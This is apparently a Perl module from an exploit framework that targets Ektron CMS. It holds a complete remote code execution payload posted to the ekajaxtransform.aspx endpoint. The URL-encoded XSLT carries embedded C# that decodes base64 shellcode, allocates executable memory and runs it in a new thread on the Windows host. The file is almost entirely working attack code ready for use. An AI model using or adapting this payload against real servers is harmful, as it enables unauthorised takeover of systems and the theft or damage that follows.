package P1rK3r::Exploits::EKTRON::MSF::EktronXsltExec;
use parent qw(P1rK3r::Exploit P1rK3r::Services::EKTRON);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "EktronXsltExec";

   my $DETECTION = {

   };

   my $EXPLOIT = {
        TYPE => 'MSF',
        PLATFORM => 'WINDOWS',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => 'WorkArea/ContentDesigner/ekajaxtransform.aspx',
                        PAYLOAD      => 'xml=XpWYZL&xslt=%3c%3fxml%20version%3d%271.0%27%3f%3e%0a%3cxsl%3astylesheet%20version%3d%221.0%22%0axmlns%3axsl%3d%22http%3a//www.w3.org/1999/XSL/Transform%22%0axmlns%3amsxsl%3d%22urn%3aschemas-microsoft-com%3axslt%22%0axmlns%3auser%3d%22http%3a//mycompany.com/mynamespace%22%3e%0a%3cmsxsl%3ascript%20language%3d%22C%23%22%20implements-prefix%3d%22user%22%3e%0a%3c%21%5bCDATA%5b%0a%0aprivate%20static%20UInt32%20MEM_COMMIT%20%3d%200x1000%3b%0aprivate%20static%20UInt32%20PAGE_EXECUTE_READWRITE%20%3d%200x40%3b%0a%0a%5bSystem.Runtime.InteropServices.DllImport%28%22kernel32%22%29%5d%0aprivate%20static%20extern%20UInt32%20VirtualAlloc%28UInt32%20lpStartAddr%2c%20UInt32%20size%2c%20UInt32%20flAllocationType%2c%20UInt32%20flProtect%29%3b%0a%0a%5bSystem.Runtime.InteropServices.DllImport%28%22kernel32%22%29%5d%0aprivate%20static%20extern%20IntPtr%20CreateThread%28UInt32%20lpThreadAttributes%2c%20UInt32%20dwStackSize%2c%20UInt32%20lpStartAddress%2c%20IntPtr%20param%2c%20UInt32%20dwCreationFlags%2c%20ref%20UInt32%20lpThreadId%29%3b%0a%0apublic%20string%20xml%28%29%0a%7b%0a%20%20string%20shellcode64%20%3d%20%40%22R/0/9ZAvR5P4mD%2bYQJn1L0NGl0qY/fif%2bUlJk0dJ%2bZaWQfmWN/2fQP1Lkz%2bXmUGRn/mQ/ZiZk0pGmUJJSNZCRpGT9Un5SieRT0JC/Uafn5E3Qz%2bQl5FJTidP/JBC1pM/R/yQkklKlkaS1v1Bk08nN59OL/n1m0tGTk4vS5Obn/xGn0A/li%2bTQ0qTmZH1Rkj5RkknPydATpMnk/34kj9GTkORQ5CQT/1BRkn9l09A1kCRSJmYSktGSfknN5mbTk4/kZj8mE9Cky9OQC9PSZk3R5iTmUZORkqRQDeRT5KY%2bPk/S0tKSUOfQ0hJk0BJ9U%2bTL0FJN5lLlpORTkGYL0pBSJGTSpgvSJtJ%2bZibkvmS1ief1jdKN/XW/UbWmEvWQ/z5n5NBSEgvmUj1Qi831kBBmE9L%2bEaQl/mTSJlDk9ZHQ/n1SE6Q%2bEORTpJJkkb8R0CYL0L8T5Y/n5iRSvlAR/z8NzdCQvxDQkaT1klHT0CSmEAv/UKXmJtBkpI/Q/yQ1tZI/fVO%2bUKYL0GWN/xH%2bP1DJ/WZ%2bU%2bfl/WWkUNOQ0j4RzdJS0aS/JBBR9Yn/C%2bR1pGQS9ZOSNb5mUiWP0BDST9LQzdAQf2W9UP4mEn51j9IS5/4%2bEabl0NG9SeQkjc//Z%2bWkZsnR5NCJ5P4Sks/RkqbJ0nWm0v1%2bJGWL0mbn/mXLz83S/yTN0svn9ZJTpI/lic3kPhHT5lBkpL4N5JBTkM3R5svki9IN09PSJlDTk6TT5uW%2bf39lviSP0EnRjf1n09Jmz%2bW9ZPWSJM3%2bE75QEI3J0D1TpYvT0hHmJ9PlidBRk/9Ti/4J0HW/E9KmUGSQ0BKSEtKL0dHQUJC1kM/kpefL0v8/ZCWl5BKN0GRSZg/kj%2bfmNZP%2bZNL%2bSebQjefNz%2bWQzeRN5dIS59BN/yRL5lB%2bfWYQEtOSZfWRp%2bfQphARpbWSUpAkJgnN05BSZeTkD9AkfiZQZifP5ZPS5mWkUP9%2bUtO/ZaRkpL4SEY3%2bUD8Rk5G/UdC%2bJiZkNZORkpDP/1HStZP/ZdATzcn/Pn4/UeZQZk3S5aQSPxJSEE/SkH9kkmb%2bUj8%2bJaTR5iQktaZR59GQJA3kdaWmJGfSJf9l5tG%2bE711vX4/JEnQ0NAkkufkJNPSE9ISJaWNzdOQ0qR%2bJ%2bb%2bJ9GkZeYQfWTTvyRkJDWn5dOQ5NDQENDkvlPm5FKlpJJl5CRl0nWTkD5/EkvQZhLQk9K%2bUb5n5ZJSJNAQ5iQRz/4P5GTP5JPR5FJSJDWn/2TR5abR0JLQkjWSSdJR5dIT/hIL0dHlklDSpeY/ZtJL5H9Qp9Llp9PlkFGL5JBN/j1kJaSN5CY/UuTJ/jWQEaSkUhPTy%2bYmUaY1pj9QZJGQ0NAl/xB%2bfmQJ0dHN0OXSD9H/J%2bbRzfWl0eTSE/1kUZAn5tHl9Y/kJJHmUdA1i9I/Z%2bRR0hHTtbWRkPWl0JASpOXkpv4SpubTkhKS5JBR0lDlklHP5mSR0CXmdY/k5dP%2bEFCm5eWT5BAkvlOSvn5R0uZJ0L4J0b1k/VIN0%2bfT5eQl0KbP5f4kEifk/lDNydJmUH1m5NKQSeTL0ZHSktDP5tLQp/Wlpab%2bEuT%2bC/1k0eSSpZOQSefSEefSZiRSkD59Z/1J/1G%2bEj4P0FLkUCY9U6fmZE3kkL4Q5KTN59DR/n5Tjf4m0pBn5CXRi9LkZg3QZtCmJZO/dZLmJ83%2bUuX1vhI%2bZeZkT/8SPgnkZuRQUZP%2bNZKRz9Ok5%2bTmCdOQ0JGN0JAQUcnSpZLk5YvT0qbSfiZT0GQmU6QQUf5/ZeXkZ/1Qpn1/S9I%2bD%2bXSy/8/EpKQz%2bZ/f34Q0mTQ5ubRvWbSNYn%2bZP9/EhJL5mWQUeS9ZhOn5dPQPmY%2bD9H/EZDSUlHP/w/mUhL9U%2bZ/D/5n0NAQJ9Am06ZSpNCm0pH%2bPj8%2bUhOmZH4m/wnl0D1J0FKlk/8mEv1/Eb1lp%2bT1k78RvWRQv2W/SeWmZ%2bY1kA3TpAnNyefkpFG%2bZaSST9O/T/W1kdDmZiSlpOYlpCbR5ZOR5ibS/n8n0NA9UdClvlPn5aYQ/z1%2bUtAn5eb/Pj8S0NOk5%2bf9ScvSpH1kZhCSSfWQz%2bWL/hD1k%2bfmUv5ly%2bT%2bE5ON0NCmdbWP0j4P05J/EiY1phJ%2bJ%2bYmf0n/JOTR0ovSZ9L/JiSkJZBS5hL9U5AS5H9SEeQQZ9G9S%2bWn/mYkvWXSZBC/CfWJ0qY/JhKRk6YkEn8T0eTTpJJkJ9BQZeY1peZQ5n1JydKkUH8SEFAkpYvSkj1Sk8v9UmR1k%2bfS0FP%2bJL4Q0JDSpiTLydJSZk3mEuTT0JH1ptJSE6fQUqbkpNKkvxH9UM/%2bD%2bWkCdJR5BP9T9A/EdHQEhDkNZI9S8/P0aYR5NK9UeZSZOZkpmW%2bJZI/EL4lpOQP5ubSEqblvj8SCefS0BCR5NLl0qZmZOYkpk3QkGSl0hB9TcnQy9OmZefQJb5SUmYL/z8J0BGQ0JCk0FG/fwvQpNLSvmXT5CYN0kvL5%2bfS0cvkyf4TpFJ9UBGP5dOSvmX/EibkECfkpGYN/VKQkhLlpNJSP1CRj9PlkD4%2bUlKlvhATpGXP5NJmSdHSSf1/JlGSPz1%2bJlAmdab%2bEeY/EcvN5DWN06ZSkE/ktZCSEaQmEn9ny9H/fxIS0qQ/U5L%2bUtJQ09GlkGWmEk/kpiYQEFBL0NKSPU/S0cvkJmX%2bSc/RktCSC%2bTTpP8T5s/kZdAgcRU8v//X19QQVlMT0FEX18%3d%22%3b%0a%20%20byte%5b%5d%20shellcode%20%3d%20System.Convert.FromBase64String%28shellcode64%29%3b%0a%20%20UInt32%20funcAddr%20%3d%20VirtualAlloc%280%2c%20%28UInt32%29shellcode.Length%2c%20MEM_COMMIT%2c%20PAGE_EXECUTE_READWRITE%29%3b%0a%20%20System.Runtime.InteropServices.Marshal.Copy%28shellcode%20%2c%200%2c%20%28IntPtr%29%28funcAddr%29%2c%20shellcode%20.Length%29%3b%0a%20%20IntPtr%20hThread%20%3d%20IntPtr.Zero%3b%0a%20%20IntPtr%20pinfo%20%3d%20IntPtr.Zero%3b%0a%20%20UInt32%20threadId%20%3d%200%3b%0a%20%20hThread%20%3d%20CreateThread%280%2c%200%2c%20funcAddr%2c%20pinfo%2c%200%2c%20ref%20threadId%29%3b%0a%20%20return%20%22OJeikTAX%22%3b%0a%7d%0a%5d%5d%3e%0a%3c/msxsl%3ascript%3e%0a%3cxsl%3atemplate%20match%3d%22/%22%3e%0a%3cxsl%3avalue-of%20select%3d%22user%3axml%28%29%22/%3e%0a%3c/xsl%3atemplate%3e%0a%3c/xsl%3astylesheet%3e%0a',
                        TEXT         => 'Sending Exploit #1 Request : [POST] /WorkArea/ContentDesigner/ekajaxtransform.aspx',
                        HEADERS      => {
                           'Referer' => 'http://127.0.0.1:80/WINDOWS/EKTRON/EktronXsltExec/',
                           'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
